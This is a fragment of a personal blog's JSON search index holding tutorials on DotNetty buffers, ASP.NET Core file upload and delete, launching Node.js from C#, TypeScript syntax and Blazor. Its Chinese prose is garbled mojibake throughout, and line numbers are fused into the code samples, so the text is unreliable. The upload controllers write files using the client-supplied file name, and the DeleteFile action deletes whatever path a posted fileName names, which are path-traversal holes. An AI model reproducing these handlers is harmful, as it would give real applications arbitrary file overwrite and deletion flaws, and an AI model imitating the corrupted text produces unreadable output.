å¯ä¸¢å¼ƒå­—èŠ‚è¯»æ“ä½œåï¼Œå­—èŠ‚ç§¯ç´¯åœ¨â€å¯ä¸¢å¼ƒâ€æ®µï¼Œå§‹äºreaderIndexã€‚discardReadBytes()é‡Šæ”¾å·²è¯»å­—èŠ‚ï¼Œå›æ”¶ç©ºé—´ï¼Œå¯èƒ½å¯¼è‡´ä¹‹å‰æ•°æ®ç§»åŠ¨ã€‚æ­¤æ“ä½œå¯èƒ½æ¶‰åŠå†…å­˜å¤åˆ¶ï¼Œè°¨æ…ä½¿ç”¨ã€‚ å¯è¯»å­—èŠ‚ï¼šå­˜å‚¨å®é™…æ•°æ®ï¼Œæ–°ç¼“å†²åŒºé»˜è®¤ä»readerIndex&#x3D;0å¼€å§‹ã€‚å¯å†™å­—èŠ‚ï¼šç©ºç™½åŒºåŸŸå¾…å†™å…¥ï¼Œæ–°ç¼“å†²åŒºwriterIndexåˆè®¾0ï¼Œå†™æ“ä½œåè‡ªåŠ¨é€’å¢ã€‚ èµ„æºé‡Šæ”¾å¤„ç†Nettyå…¥ç«™ByteBuffer ï¼Œå¯é€‰è‡ªåŠ¨é‡Šæ”¾ï¼šç”¨SimpleChannelInboundHandlerï¼Œæˆ–åœ¨channelRead()æœ«æ‰‹åŠ¨è°ƒç”¨ReferenceCountUtil.release(msg)ç¡®ä¿èµ„æºç®¡ç†ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344using DotNetty.Buffers;using DotNetty.Transport.Channels;public class CommanChannelInboundHandler : SimpleChannelInboundHandler&lt;object&gt;&#123; protected override void ChannelRead(IChannelHandlerContext context, object message) &#123; bool shouldRelease = true; try &#123; if (IsMessageAcceptable(message)) &#123; ChannelRead0(context, message); &#125; else &#123; shouldRelease = false; context.FireChannelRead(message); &#125; &#125; finally &#123; if (AutoRelease &amp;&amp; shouldRelease) &#123; ResourceUtil.Release(message); &#125; &#125; &#125; private bool IsMessageAcceptable(object msg) &#123; return msg is IByteBuffer; // å‡è®¾åªå¤„ç†IByteBufferç±»å‹çš„æ¶ˆæ¯ &#125; protected virtual void ChannelRead0(IChannelHandlerContext context, object message) &#123; //IByteBuffer ... &#125; private bool AutoRelease &#123; get; set; &#125; = true;&#125; å¯¹äºå‡ºç«™è¯·æ±‚ï¼Œä¸ç®¡ ByteBuffer æ˜¯å¦ç”±æˆ‘ä»¬çš„ä¸šåŠ¡åˆ›å»ºçš„ï¼Œå½“è°ƒç”¨äº† write æˆ–è€… writeAndFlush æ–¹æ³•åï¼ŒNetty ä¼šè‡ªåŠ¨æ›¿æˆ‘ä»¬é‡Šæ”¾ï¼Œä¸éœ€è¦æˆ‘ä»¬ä¸šåŠ¡ä»£ç è‡ªè¡Œé‡Šæ”¾ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// åˆ›å»ºByteBufå¯¹è±¡ï¼Œåˆå§‹å®¹é‡ä¸º1ï¼Œå†…éƒ¨åŠ¨æ€æ‰©å®¹ä»¥å®¹çº³æ›´å¤šæ•°æ®IByteBuffer byteBuf = Unpooled.Buffer(1);Console.WriteLine(&quot;byteBuf=&quot; + byteBuf);for (int i = 0; i &lt; 8; i++)&#123; byteBuf.WriteByte(i);&#125;Console.WriteLine(&quot;byteBuf=&quot; + byteBuf);for (int i = 0; i &lt; 5; i++)&#123; Console.WriteLine(byteBuf.GetByte(i));&#125;Console.WriteLine(&quot;byteBuf=&quot; + byteBuf);for (int i = 0; i &lt; 5; i++)&#123; Console.WriteLine(byteBuf.ReadByte());&#125;Console.WriteLine(&quot;byteBuf=&quot; + byteBuf);//byteBuf2// ä½¿ç”¨Unpooledå·¥å…·ç±»åˆ›å»ºByteBufï¼Œå†…å®¹ä¸º&quot;hello,world!&quot;IByteBuffer byteBuf2 = Unpooled.CopiedBuffer(&quot;hello,world!&quot;, Encoding.UTF8); // Unpooled.CopiedBuffer(&quot;hello,world!&quot;, Encoding.UTF8);// ä½¿ç”¨ç›¸å…³çš„æ–¹æ³•if (byteBuf2.HasArray) // if (byteBuf2.HasArray)&#123; byte[] content = byteBuf2.Array; // å°†contentè½¬æˆå­—ç¬¦ä¸² Console.WriteLine(Encoding.UTF8.GetString(content)); Console.WriteLine(&quot;byteBuf2=&quot; + byteBuf2); Console.WriteLine(byteBuf2.GetByte(0)); // è·å–æ•°ç»„0è¿™ä¸ªä½ç½®çš„å­—ç¬¦&#x27;h&#x27;çš„ASCIIç ï¼Œh=104 int len = byteBuf2.ReadableBytes; // å¯è¯»çš„å­—èŠ‚æ•° 12 Console.WriteLine(&quot;len=&quot; + len); // ä½¿ç”¨forå–å‡ºå„ä¸ªå­—èŠ‚å¹¶è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦æ‰“å° for (int i = 0; i &lt; len; i++) &#123; Console.WriteLine((char)byteBuf2.GetByte(i)); &#125; // èŒƒå›´è¯»å– Console.WriteLine(byteBuf2.GetCharSequence(0, 6, Encoding.UTF8)); Console.WriteLine(byteBuf2.GetCharSequence(6, 6, Encoding.UTF8));&#125;//byteBuf3 WrappedBuffervar str1 = Encoding.UTF8.GetBytes(&quot;hello,world!&quot;);var byteBuf3 = Unpooled.WrappedBuffer(str1);if (byteBuf3.HasArray) // if (byteBuf2.HasArray)&#123; byte[] content = byteBuf3.Array; // å°†contentè½¬æˆå­—ç¬¦ä¸² Console.WriteLine(Encoding.UTF8.GetString(content)); Console.WriteLine(&quot;byteBuf3=&quot; + byteBuf3); Console.WriteLine(byteBuf3.GetByte(0)); // è·å–æ•°ç»„0è¿™ä¸ªä½ç½®çš„å­—ç¬¦&#x27;h&#x27;çš„ASCIIç ï¼Œh=104 int len = byteBuf3.ReadableBytes; // å¯è¯»çš„å­—èŠ‚æ•° 12 Console.WriteLine(&quot;len=&quot; + len); // ä½¿ç”¨forå–å‡ºå„ä¸ªå­—èŠ‚å¹¶è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦æ‰“å° for (int i = 0; i &lt; len; i++) &#123; Console.WriteLine((char)byteBuf3.GetByte(i)); &#125; // èŒƒå›´è¯»å– Console.WriteLine(byteBuf3.GetCharSequence(0, 6, Encoding.UTF8)); Console.WriteLine(byteBuf3.GetCharSequence(6, 6, Encoding.UTF8));&#125; ç»“æœå¾—å‡º getæ“ä½œ readerIndex ä¸å˜ï¼Œreadæ“ä½œä½¿å…¶ç§»åŠ¨ã€‚ End","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":".NET FileUpload","slug":"NET-Fileupload","date":"2024-05-20T13:14:38.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/20/NET-Fileupload/","permalink":"https://banjinmei.github.io/2024/05/20/NET-Fileupload/","excerpt":"","text":"VS2022 .NET8 ğŸ’¾åŸºç¡€ä¸Šä¼ ç¤ºä¾‹view 12345678910111213@&#123; ViewData[&quot;Title&quot;] = &quot;File Upload&quot;;&#125;&lt;h1&gt;@ViewData[&quot;Title&quot;]&lt;/h1&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;/Home/UploadFile&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; class=&quot;form-control&quot; /&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Upload&lt;/button&gt;&lt;/form&gt; controller 1234567891011121314151617181920212223242526[HttpPost]public async Task&lt;IActionResult&gt; UploadFile()&#123; var file = Request.Form.Files[0]; if (file != null &amp;&amp; file.Length &gt; 0) &#123; var uploads = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;up&quot;); if (!Directory.Exists(uploads)) &#123; Directory.CreateDirectory(uploads); &#125; var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(fileStream); &#125; // SAVE TO DB return RedirectToAction(&quot;Index&quot;); &#125; return View();&#125; 1app.UseStaticFiles(); run ğŸ“€ä¼˜åŒ– é™åˆ¶æ–‡ä»¶å¤§å°ä¸Šä¼ æ–‡ä»¶å¤¹å¦‚ img &#x3D;&gt; img rar &#x3D;&gt; fileé™åˆ¶æ–‡ä»¶å¤§å° 12345678910111213141516171819202122232425262728// æ ¹æ®æ–‡ä»¶ç±»å‹é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶å¤¹string fileExtension = Path.GetExtension(file.FileName).ToLower();switch (fileExtension)&#123; case &quot;.jpg&quot;: case &quot;.png&quot;: uploadFolder = Path.Combine(&quot;wwwroot&quot;, &quot;img&quot;); break; case &quot;.mp4&quot;: // æ£€æŸ¥è§†é¢‘å¤§å°æ˜¯å¦è¶…è¿‡é™åˆ¶ if (file.Length &gt; 20 * 1024 * 1024) // 20MB &#123; ModelState.AddModelError(&quot;File&quot;, &quot;Video file size should not exceed 20MB.&quot;); return View(&quot;Index&quot;, file); &#125; uploadFolder = Path.Combine(&quot;wwwroot&quot;, &quot;vd&quot;); break; case &quot;.m4a&quot;: uploadFolder = Path.Combine(&quot;wwwroot&quot;, &quot;sound&quot;); break; case &quot;.rar&quot;: uploadFolder = Path.Combine(&quot;wwwroot&quot;, &quot;file&quot;); break; default: ModelState.AddModelError(&quot;File&quot;, &quot;Unsupported file format.&quot;); return View(&quot;Index&quot;, file);&#125; ğŸª«åˆ é™¤view 1234567891011121314151617181920212223242526272829303132333435@model IEnumerable&lt;string&gt;&lt;h1&gt;Uploaded Files&lt;/h1&gt;@if (Model.Any())&#123; &lt;table class=&quot;table&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;File Name&lt;/th&gt; &lt;th&gt;Action&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; @foreach (var fileName in Model) &#123; &lt;tr&gt; &lt;td&gt;@fileName&lt;/td&gt; &lt;td&gt; &lt;form method=&quot;post&quot; asp-action=&quot;DeleteFile&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;fileName&quot; value=&quot;@fileName&quot; /&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger&quot;&gt;Delete&lt;/button&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &#125; &lt;/tbody&gt; &lt;/table&gt;&#125;else&#123; &lt;p&gt;No files uploaded yet.&lt;/p&gt;&#125; controller 1234567891011[HttpPost]public IActionResult DeleteFile(string fileName)&#123; var uploadFolder = Path.Combine(Directory.GetCurrentDirectory(), &quot;wwwroot&quot;, &quot;img&quot;); var filePath = Path.Combine(uploadFolder, fileName); if (System.IO.File.Exists(filePath)) &#123; System.IO.File.Delete(filePath); &#125; return RedirectToAction(&quot;Files&quot;);&#125; ğŸ’¿ï¸é‡å‘½å123456string fileName = $&quot;&#123;DateTime.Now:yyyyMMddHHmmssfff&#125;&#123;new Random().Next(1000, 9999)&#125;&#123;fileExtension&#125;&quot;;var filePath = Path.Combine(uploads, fileName);using (var fileStream = new FileStream(filePath, FileMode.Create))&#123; await file.CopyToAsync(fileStream);&#125; ğŸ’½å¤šæ–‡ä»¶ä¸Šä¼ controller 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970[ApiController][Route(&quot;[controller]&quot;)]public class FileUploadController : ControllerBase&#123; private readonly string UploadsDirectory = Path.Combine(Directory.GetCurrentDirectory(), &quot;uploads&quot;); public FileUploadController() &#123; // åˆ›å»ºä¸Šä¼ æ–‡ä»¶å¤¹ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰ if (!Directory.Exists(UploadsDirectory)) &#123; Directory.CreateDirectory(UploadsDirectory); &#125; &#125; [HttpPost] [Route(&quot;upload&quot;)] public async Task&lt;IActionResult&gt; Upload(IFormFile[] files) &#123; if (files == null || files.Length == 0) &#123; return BadRequest(&quot;No files uploaded.&quot;); &#125; foreach (var file in files) &#123; if (file.Length == 0) &#123; return BadRequest($&quot;File &#123;file.FileName&#125; is empty.&quot;); &#125; // æ ¹æ®æ–‡ä»¶ç±»å‹é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶å¤¹ string uploadFolder = GetUploadFolder(file.FileName); // é‡å‘½åæ–‡ä»¶ä¸ºæŒ‡å®šæ ¼å¼ string fileName = $&quot;&#123;DateTime.Now:yyyyMMddHHmmssfff&#125;_&#123;Guid.NewGuid()&#125;&#123;Path.GetExtension(file.FileName)&#125;&quot;; string filePath = Path.Combine(UploadsDirectory, uploadFolder, fileName); using (var stream = new FileStream(filePath, FileMode.Create)) &#123; await file.CopyToAsync(stream); &#125; // åœ¨è¿™é‡Œå¯ä»¥å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„é€»è¾‘ï¼Œæ¯”å¦‚ä¿å­˜æ–‡ä»¶ä¿¡æ¯åˆ°æ•°æ®åº“ç­‰ &#125; return Ok(&quot;Files uploaded successfully.&quot;); &#125; private string GetUploadFolder(string fileName) &#123; string fileExtension = Path.GetExtension(fileName).ToLower(); switch (fileExtension) &#123; case &quot;.jpg&quot;: case &quot;.png&quot;: return &quot;img&quot;; case &quot;.mp4&quot;: return &quot;vd&quot;; case &quot;.m4a&quot;: return &quot;sound&quot;; case &quot;.rar&quot;: return &quot;file&quot;; default: throw new NotSupportedException($&quot;Unsupported file format for &#123;fileName&#125;.&quot;); &#125; &#125;&#125; view 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@&#123; ViewBag.Title = &quot;File Upload&quot;;&#125;&lt;h2&gt;File Upload2&lt;/h2&gt;&lt;form id=&quot;uploadForm&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; id=&quot;fileInput&quot; multiple&gt; &lt;input type=&quot;button&quot; value=&quot;Upload&quot; onclick=&quot;uploadFiles()&quot; /&gt;&lt;/form&gt;&lt;div id=&quot;message&quot;&gt;&lt;/div&gt;@section scripts &#123; &lt;script&gt; function uploadFiles() &#123; var files = document.getElementById(&#x27;fileInput&#x27;).files; if (files.length === 0) &#123; showMessage(&#x27;No files selected.&#x27;); return; &#125; var formData = new FormData(); for (var i = 0; i &lt; files.length; i++) &#123; formData.append(&#x27;files&#x27;, files[i]); &#125; $.ajax(&#123; url: &#x27;@Url.Action(&quot;Upload&quot;, &quot;FileUpload&quot;)&#x27;, type: &#x27;POST&#x27;, data: formData, processData: false, contentType: false, success: function (response) &#123; showMessage(response); &#125;, error: function (xhr, status, error) &#123; showMessage(&#x27;Upload failed: &#x27; + error); &#125; &#125;); &#125; function showMessage(message) &#123; $(&#x27;#message&#x27;).text(message); &#125; &lt;/script&gt;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"c# run nodejs","slug":"nodejs-run-c","date":"2024-05-20T13:13:27.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/20/nodejs-run-c/","permalink":"https://banjinmei.github.io/2024/05/20/nodejs-run-c/","excerpt":"","text":"åœ¨C#ä¸­è°ƒç”¨Node.jsæ—¶ï¼Œä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨è¿›ç¨‹é—´é€šä¿¡ï¼ˆInter-Process Communicationï¼ŒIPCï¼‰ï¼Œä¾‹å¦‚ä½¿ç”¨å­è¿›ç¨‹ã€‚å¯ä»¥ä½¿ç”¨C#ä¸­çš„Processç±»æ¥å¯åŠ¨Node.jsè¿›ç¨‹ï¼Œå¹¶é€šè¿‡æ ‡å‡†è¾“å…¥è¾“å‡ºä¸å…¶è¿›è¡Œé€šä¿¡ã€‚ C# run nodejs12345678910// n.js// ç›‘å¬æ¥è‡ªæ ‡å‡†è¾“å…¥çš„æ¶ˆæ¯process.stdin.on(&#x27;data&#x27;, function (data) &#123; // æ”¶åˆ°æ¶ˆæ¯åï¼Œåœ¨æ§åˆ¶å°è¾“å‡ºå¹¶å›å¤æ¶ˆæ¯ console.log(&quot;Message from C#: &quot; + data.toString()); process.stdout.write(&quot;Hello from Node.js!&quot;);&#125;); 12345678910111213141516171819202122232425262728293031323334353637383940ProcessStartInfo startInfo = new ProcessStartInfo();startInfo.FileName = &quot;node&quot;; // Node.jså¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœå·²åœ¨ç³»ç»Ÿè·¯å¾„ä¸­ï¼Œåˆ™ä¸éœ€è¦æä¾›å®Œæ•´è·¯å¾„startInfo.Arguments = &quot;n.js&quot;; // æ‰§è¡Œçš„Node.jsè„šæœ¬æ–‡ä»¶è·¯å¾„startInfo.UseShellExecute = false;startInfo.RedirectStandardInput = true;startInfo.RedirectStandardOutput = true;Process nodeProcess = new Process();nodeProcess.StartInfo = startInfo;// å¯åŠ¨è¿›ç¨‹nodeProcess.Start();// ä¸Node.jsè¿›ç¨‹è¿›è¡Œé€šä¿¡using (var writer = nodeProcess.StandardInput)&#123; if (writer.BaseStream.CanWrite) &#123; // å‘Node.jsè¿›ç¨‹å‘é€æ¶ˆæ¯ writer.WriteLine(&quot;Hello from C#!&quot;); &#125;&#125;// è¯»å–Node.jsè¿›ç¨‹çš„è¾“å‡ºusing (var reader = nodeProcess.StandardOutput)&#123; if (reader.BaseStream.CanRead) &#123; // ä»Node.jsè¿›ç¨‹è¯»å–å“åº” string response = reader.ReadLine(); Console.WriteLine(&quot;Response from Node.js: &quot; + response); &#125;&#125;Console.Read();// ç­‰å¾…Node.jsè¿›ç¨‹ç»“æŸnodeProcess.WaitForExit();nodeProcess.Close(); Socketserver1234567891011121314151617181920212223242526272829const net = require(&#x27;net&#x27;);// åˆ›å»ºä¸€ä¸ªæœåŠ¡å™¨å®ä¾‹const server = net.createServer((socket) =&gt; &#123; // è¿æ¥å»ºç«‹æ—¶è§¦å‘ console.log(&#x27;Client connected.&#x27;); // ç›‘å¬å®¢æˆ·ç«¯å‘é€çš„æ•°æ® socket.on(&#x27;data&#x27;, (data) =&gt; &#123; console.log(&#x27;Received from client: &#x27; + data.toString()); // å‘å®¢æˆ·ç«¯å‘é€å“åº”æ•°æ® socket.write(&#x27;Hello from Node.js!&#x27; + data.toString()); &#125;); // ç›‘å¬è¿æ¥æ–­å¼€äº‹ä»¶ socket.on(&#x27;end&#x27;, () =&gt; &#123; console.log(&#x27;Client disconnected.&#x27;); &#125;);&#125;);// ç›‘å¬æŒ‡å®šç«¯å£const port = 24520;server.listen(port, () =&gt; &#123; console.log(&#x27;Node Server listening on port &#x27; + port);&#125;); 1234567891011121314151617181920212223242526// å¯åŠ¨ Node.js æœåŠ¡å™¨çš„ Node.js è„šæœ¬æ–‡ä»¶è·¯å¾„string nodeScriptPath = &quot;n.js&quot;;// å¯åŠ¨ Node.js è¿›ç¨‹ProcessStartInfo startInfo = new ProcessStartInfo();startInfo.FileName = &quot;node&quot;; // Node.js å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœå·²åœ¨ç³»ç»Ÿè·¯å¾„ä¸­ï¼Œåˆ™ä¸éœ€è¦æä¾›å®Œæ•´è·¯å¾„startInfo.Arguments = nodeScriptPath; // Node.js è„šæœ¬æ–‡ä»¶è·¯å¾„startInfo.UseShellExecute = false;startInfo.RedirectStandardOutput = true;Process nodeProcess = new Process();nodeProcess.StartInfo = startInfo;// Node.js æœåŠ¡å™¨è¾“å‡ºçš„äº‹ä»¶å¤„ç†å‡½æ•°nodeProcess.OutputDataReceived += (sender, e) =&gt;&#123; Console.WriteLine(e.Data); // è¾“å‡º Node.js æœåŠ¡å™¨çš„è¾“å‡ºä¿¡æ¯&#125;;// å¯åŠ¨è¿›ç¨‹nodeProcess.Start();nodeProcess.BeginOutputReadLine(); // å¼€å§‹å¼‚æ­¥è¯»å– Node.js æœåŠ¡å™¨çš„è¾“å‡º// ç­‰å¾… Node.js è¿›ç¨‹ç»“æŸnodeProcess.WaitForExit();nodeProcess.Close(); run client1234567891011121314151617181920212223// è¿æ¥åˆ° Node.js æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£string serverAddress = &quot;127.0.0.1&quot;; // æœ¬åœ°åœ°å€int serverPort = 24520; // Node.js æœåŠ¡å™¨ç«¯å£// åˆ›å»º TcpClient å®ä¾‹using (TcpClient client = new TcpClient(serverAddress, serverPort))&#123; // è·å–ç”¨äºå‘æœåŠ¡å™¨å‘é€æ•°æ®çš„ç½‘ç»œæµ using (NetworkStream stream = client.GetStream()) &#123; // å‘é€æ•°æ®åˆ°æœåŠ¡å™¨ string message = &quot;hi from C#!&quot;; byte[] data = Encoding.ASCII.GetBytes(message); stream.Write(data, 0, data.Length); Console.WriteLine(&quot;Sent: &quot; + message); // è¯»å–æœåŠ¡å™¨çš„å“åº” byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); string response = Encoding.ASCII.GetString(buffer, 0, bytesRead); Console.WriteLine(&quot;Received: &quot; + response); &#125;&#125; run nodejs run c#Node.js ä½¿ç”¨ child_process.exec() å‡½æ•°æ‰§è¡Œ c# exe 1Console.WriteLine(&quot;hi c# &quot;); 123456789101112131415//runc.jsconst &#123; exec &#125; = require(&#x27;child_process&#x27;);// æ‰§è¡Œ hello.exeexec(&#x27;ConNode.exe&#x27;, (error, stdout, stderr) =&gt; &#123; if (error) &#123; console.error(`æ‰§è¡Œé”™è¯¯: $&#123;error.message&#125;`); return; &#125; if (stderr) &#123; console.error(`æ‰§è¡Œé”™è¯¯: $&#123;stderr&#125;`); return; &#125; console.log(`C# è¾“å‡º: $&#123;stdout&#125;`);&#125;); run 1node runc.js","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"}],"author":"mu"},{"title":"Typescript","slug":"Typescript-ts","date":"2024-05-19T16:07:45.000Z","updated":"2024-06-01T03:08:40.000Z","comments":true,"path":"2024/05/20/Typescript-ts/","permalink":"https://banjinmei.github.io/2024/05/20/Typescript-ts/","excerpt":"","text":"typescript â‰ˆ javascript plus ğŸ”—setup1npm install typescript -g 1tsc -version 1npm install ts-node -g ğŸ–Œï¸hello world12let str = &quot;hi&quot;console.log(str); 1ts-node t.ts ğŸ–‹ï¸datatype1234567let a1 :string =&#x27;abc&#x27;let a2:number = 2let a3 :boolean =truelet nu:null =nulllet un:undefined = undefinedlet a4:string|null = nulllet a5:1|2|3 = 2 any12345let a:anya= 1a=&quot;1&quot;a=true strong type 123let a:string = &quot;123&quot;a=1 Err 1234567891011let a:unknowna= 1a=&quot;1&quot;a=truelet b :String if(typeof a ==&quot;string&quot;)&#123; b=a &#125; enum æšä¸¾123enum Color &#123; RED,BLUE,BLACK&#125;let color = Color.BLACK; //Color[2]console.log(color); 1ts-node t.ts or to js 1tsc t.ts to see t.js Array12345let arr :number[] = [1,2,3]let arr2 :Array&lt;string&gt; = [&#x27;a&#x27;,&#x27;b&#x27;] å…ƒç»„1234let arr:[String,number,boolean] =[&quot;123&quot;,1,true]let a1 :[number,string,number?] = [1,&quot;11&quot;] ğŸ–Šï¸function1234567function myFn(a:number,b:string,c?:boolean,...rest:number[]) :number&#123; return 100&#125;const f = myFn(10,&#x27;123&#x27;,true,1,2,3) âœ’ï¸interface123456789101112interface Obj&#123; name :string, age:number&#125;const obj:Obj=&#123; name:&#x27;a&#x27;, age:15&#125; ğŸ“type12345let a: String |number = 10 type myname = string |numberlet b:myname = 10let b2:myname = &quot;10&quot; ğŸ“T æ³›å‹1234567function myFn&lt;T&gt;(a:T,b:T):T[]&#123; return [a,b]&#125;myFn&lt;number&gt;(1,2)myFn(&#x27;a&#x27;,&#x27;b&#x27;) ğŸ“extends123456789101112131415161718interface Parent&#123; p1 :string p2:number &#125;interface Child extends Parent&#123; p3:string&#125;const v1 :Child=&#123; p1 :&quot;123&quot;, p2:1, p3:&quot;12&quot;&#125; ğŸ”§class12345678910111213141516171819202122232425262728293031323334353637class Article&#123; public title:string con:string temp1?:string tempnum= 100 private temp2 ?:string protected temp3?:string static a1 :string static readonly a2 :string =&#x27;a2st&#x27; constructor (title:string,con:string) &#123; this.title=title this.con=con &#125;&#125;const a1 =new Article(&#x27;t1&#x27;,&#x27;con1&#x27;)class B extends Article&#123; constructor (title:string ,con:string) &#123; super(title,con) this.temp3=&quot;1&quot; &#125;&#125; 12345678910111213141516class User&#123; private _password :string =&#x27;&#x27; get password():string&#123; return &#x27;****&#x27; &#125; set password (newPass:string) &#123; this._password = newPass &#125;&#125;const u1 = new User()console.log(u1.password) ğŸª›abstract12345678910111213141516171819202122232425262728abstract class Animal&#123; abstract name:string abstract makeSound():void move():void &#123; console.log(&#x27;mmm&#x27;) &#125;&#125;class Cat extends Animal&#123; name:string=&#x27;miao&#x27; makeSound(): void &#123; console.log(&quot;miaomiao&quot;) &#125;&#125;class Dog extends Animal&#123; name:string=&#x27;wang&#x27; makeSound(): void &#123; console.log(&quot;wangwang&quot;) &#125;&#125; ğŸ§²implements1234567891011121314151617181920212223interface Animal&#123; name:string get sound():string makesound():void&#125;interface AgeI&#123; age:number&#125;class Dog implements Animal,AgeI&#123; name: string = &#x27;wang&#x27; age:number = 2 get sound()&#123; return &#x27;&#x27; &#125; makesound(): void &#123; &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"helloworld","slug":"helloworld","permalink":"https://banjinmei.github.io/tags/helloworld/"},{"name":"Typescript","slug":"Typescript","permalink":"https://banjinmei.github.io/tags/Typescript/"},{"name":"datatype","slug":"datatype","permalink":"https://banjinmei.github.io/tags/datatype/"},{"name":"interface","slug":"interface","permalink":"https://banjinmei.github.io/tags/interface/"},{"name":"type","slug":"type","permalink":"https://banjinmei.github.io/tags/type/"},{"name":"T","slug":"T","permalink":"https://banjinmei.github.io/tags/T/"},{"name":"extends","slug":"extends","permalink":"https://banjinmei.github.io/tags/extends/"},{"name":"class","slug":"class","permalink":"https://banjinmei.github.io/tags/class/"},{"name":"abstract","slug":"abstract","permalink":"https://banjinmei.github.io/tags/abstract/"},{"name":"implements","slug":"implements","permalink":"https://banjinmei.github.io/tags/implements/"}],"author":"mu"},{"title":".NET Blazor","slug":"NET-Blazor","date":"2024-05-18T15:10:13.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/18/NET-Blazor/","permalink":"https://banjinmei.github.io/2024/05/18/NET-Blazor/","excerpt":"","text":"Blazor æ˜¯ä¸€ä¸ªä½¿ç”¨ C#ã€HTML å’Œ CSS æ„å»ºäº¤äº’å¼ Web UI çš„å¼€æºæ¡†æ¶ï¼Œæ”¯æŒæœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯è¿è¡Œï¼Œå…è®¸å¼€å‘è€…åˆ©ç”¨ C# å’Œ .NET ç”Ÿæ€æ¥åˆ›å»º Web åº”ç”¨ã€‚ ğŸŒ±Createcarete Blazor Web Program.cs æ˜¯å¯åŠ¨æœåŠ¡å™¨ä»¥åŠåœ¨å…¶ä¸­é…ç½®åº”ç”¨æœåŠ¡å’Œä¸­é—´ä»¶çš„åº”ç”¨çš„å…¥å£ç‚¹ã€‚åœ¨ Components ç›®å½•ä¸­: App.razor ä¸ºåº”ç”¨çš„æ ¹ç»„ä»¶ã€‚Routes.razor é…ç½® Blazor è·¯ç”±å™¨ã€‚Pages ç›®å½•åŒ…å«åº”ç”¨çš„ä¸€äº›ç¤ºä¾‹ç½‘é¡µã€‚BlazorApp.csproj å®šä¹‰åº”ç”¨é¡¹ç›®åŠå…¶ä¾èµ–é¡¹ï¼Œä¸”å¯ä»¥é€šè¿‡åŒå‡»è§£å†³æ–¹æ¡ˆèµ„æºç®¡ç†å™¨ä¸­çš„ BlazorApp é¡¹ç›®èŠ‚ç‚¹è¿›è¡ŒæŸ¥çœ‹ã€‚Properties ç›®å½•ä¸­çš„ launchSettings.json æ–‡ä»¶ä¸ºæœ¬åœ°å¼€å‘ç¯å¢ƒå®šä¹‰ä¸åŒçš„é…ç½®æ–‡ä»¶è®¾ç½®ã€‚åˆ›å»ºé¡¹ç›®æ—¶ä¼šè‡ªåŠ¨åˆ†é…ç«¯å£å·å¹¶å°†å…¶ä¿å­˜åœ¨æ­¤æ–‡ä»¶ä¸Šã€‚ ğŸª´Runpages home.razor 1234567@page &quot;/&quot;&lt;PageTitle&gt;Home&lt;/PageTitle&gt;&lt;h1&gt;Hello, world m qqqqq&lt;/h1&gt;hihihi ğŸŒ´Countercounter.razor 12345678910111213141516171819@page &quot;/counter&quot;@rendermode InteractiveServer&lt;PageTitle&gt;Counter&lt;/PageTitle&gt;&lt;h1&gt;Counter&lt;/h1&gt;&lt;p role=&quot;status&quot;&gt;Current count: @currentCount&lt;/p&gt;&lt;button class=&quot;btn btn-primary&quot; @onclick=&quot;IncrementCount&quot;&gt;Click me&lt;/button&gt;@code &#123; private int currentCount = 0; private void IncrementCount() &#123; currentCount++; &#125;&#125; åƒVue ğŸŒ³Componenthome &gt; component 1234567891011@page &quot;/&quot;&lt;PageTitle&gt;Home&lt;/PageTitle&gt;&lt;h1&gt;Hello, world m qqqqq&lt;/h1&gt;hihihi &lt;Counter /&gt; &lt;Weather&gt; &lt;/Weather&gt; Parameterä¿®æ”¹counter 123456789101112131415@code 